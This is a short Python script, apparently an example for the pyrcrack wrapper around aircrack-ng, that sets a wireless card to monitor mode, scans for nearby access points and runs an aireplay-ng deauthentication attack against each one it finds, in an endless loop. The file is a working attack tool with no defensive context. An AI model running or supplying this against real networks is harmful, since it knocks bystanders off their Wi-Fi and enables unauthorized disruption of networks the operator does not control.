"""Deauth"""
import sys
import asyncio
import pyrcrack


async def attack(interface, apo):
    """Run aireplay deauth attack."""
    async with pyrcrack.AirmonNg() as airmon:
        await airmon.set_monitor(interface['interface'], apo.channel)
        async with pyrcrack.AireplayNg() as aireplay:
            await aireplay.run(
                interface['interface'], deauth=sys.argv[1], D=True)
            print(await aireplay.proc.communicate())


async def deauth():
    """Scan for targets, return json."""
    async with pyrcrack.AirmonNg() as airmon:
        interface = (await airmon.list_wifis())[0]['interface']
        interface = (await airmon.set_monitor(interface))[0]

        async with pyrcrack.AirodumpNg() as pdump:
            await pdump.run(interface['interface'], write_interval=1)
            while True:
                await asyncio.sleep(3)
                for apo in pdump.sorted_aps():
                    await attack(interface, apo)


asyncio.run(deauth())
